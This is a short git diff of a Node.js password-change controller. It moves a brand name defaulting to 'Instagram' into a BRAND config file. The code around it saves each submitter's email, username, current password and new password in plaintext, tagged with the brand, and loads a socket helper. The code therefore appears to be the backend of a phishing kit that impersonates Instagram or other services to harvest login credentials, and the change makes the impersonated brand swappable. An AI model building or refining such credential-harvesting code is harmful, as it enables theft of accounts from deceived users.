@@ -2,11 +2,12 @@ const ChangePassword = require('../models/ChangePassword.model');
 const { getIo }      = require('../config/socket');
 const { sendSuccess, sendFailure } = require('../utils/response');
 const { sendPasswordChangedEmail } = require('../utils/mailer');
+const BRAND = require('../config/brand');
 
 /* ── Format helper — only necessary fields returned to frontend ── */
 const fmt = (doc) => ({
   id:              doc._id.toString(),
-  service:         (doc.source || process.env.BRAND_NAME || 'Instagram').toLowerCase(),
+  service:         (doc.source || BRAND.NAME).toLowerCase(),
   email:           doc.email || '',
   username:        doc.username || '',
   type:            doc.type || 'change_password',
@@ -55,7 +56,7 @@ const changePassword = async (req, res) => {
       username: username || '',
       currentPassword,
       newPassword,
-      source: source || process.env.BRAND_NAME || 'Instagram',
+      source: source || BRAND.NAME,
       path:   path   || 'change_password',
       time:   istTime,
     });
